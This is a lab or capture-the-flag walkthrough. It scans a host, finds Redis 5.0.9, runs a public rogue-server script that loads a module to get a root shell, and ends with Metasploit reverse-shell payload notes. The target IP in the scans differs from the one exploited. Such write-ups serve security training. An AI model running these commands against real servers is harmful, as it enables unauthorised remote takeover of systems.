# Wombo Walkthrough
### Summary

We'll exploit a remote code execution vulnerability in a Redis data store to gain root access to this target.

### Enumeration
##### Nmap

Let's begin with a full nmap TCP scan.
```bash
kali@kali:~$ sudo nmap -p- 192.168.83.214
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-02 04:04 EST
Nmap scan report for 192.168.83.214
Host is up (0.063s latency).
Not shown: 65529 filtered ports
PORT      STATE  SERVICE
22/tcp    open   ssh
53/tcp    closed domain
80/tcp    open   http
6379/tcp  open   redis
8080/tcp  open   http-proxy
27017/tcp open   mongod
```
Port 6379 is identified as redis. Let's run a more aggressive scan against that port.
```bash
kali@kali:~$ sudo nmap -p 6379 -sV -A 192.168.83.214
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-02 04:09 EST
Nmap scan report for 192.168.83.214
Host is up (0.068s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.9
```
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.82 seconds

This scan indicates that this is version 5.0.9 of the Redis store.
##### Exploitation
RCE https://github.com/A1vinSmith/redis-rogue-server

This should allow us to easily create a rogue redis server that leads to an elevated shell. Let's go ahead and clone this repository to our local kali host and move into that directory.
```bash
┌──(kali㉿kali)-[~]
└─$ git clone https://github.com/A1vinSmith/redis-rogue-server.git
Cloning into 'redis-rogue-server'...
remote: Enumerating objects: 83, done.
remote: Total 83 (delta 0), reused 0 (delta 0), pack-reused 83
Receiving objects: 100% (83/83), 242.26 KiB | 2.72 MiB/s, done.
Resolving deltas: 100% (19/19), done.

┌──(kali㉿kali)-[~]
└─$ cd redis-rogue-server                  

┌──(kali㉿kali)-[~/redis-rogue-server]
└─$ ls
exp.so  LICENSE  README.md  RedisModulesSDK  redis-rogue-server.py
```
Following the instructions in the repository, we can try to spawn a root shell using the python script redis-rogue-server.py.
```bash
┌──(kali㉿kali)-[~/redis-rogue-server]
└─$ python3 redis-rogue-server.py --rhost 192.168.120.111 --rport 6379 --lhost 192.168.118.14 --lport 6379
______         _ _      ______                         _____                          
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

[info] TARGET 192.168.120.111:6379
[info] SERVER 192.168.118.14:6379
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: i
[info] Interact mode start, enter "exit" to quit.
[<<] id
[>>] =uid=0(root) gid=0(root) groups=0(root)
[<<] whoami
[>>] root
[<<] 
```
Success! We now have root access on the target system.

# For revshells if wanted
### Trying to use high port on Metasploit
### Trying different payloads for the exploit
```
show payloads
set payload /linux/x64/reverse_shell_tcp
```